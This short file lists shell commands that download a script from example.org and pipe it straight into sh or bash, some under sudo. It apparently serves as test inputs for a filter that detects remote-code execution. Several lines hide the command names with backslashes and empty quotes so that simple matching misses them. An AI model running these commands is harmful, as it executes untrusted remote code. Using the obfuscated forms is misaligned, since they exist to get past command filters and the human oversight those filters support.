curl -fsSL https://example.org/install.sh | sh
wget -qO- https://example.org/i | sudo bash
curl -fsSL https://example.org/i | /bin/bash
curl -fsSL https://example.org/i | sudo -E bash -s
wget -qO- https://example.org/i | env bash
c\url https://example.org/a | sh
cu""rl https://example.org/a | sh
cu''rl https://example.org/a | sh
curl https://example.org/a | s\h
sh -c 'c\url https://example.org/a | s\h'
echo "$(cu''rl https://example.org/a | s\h)"
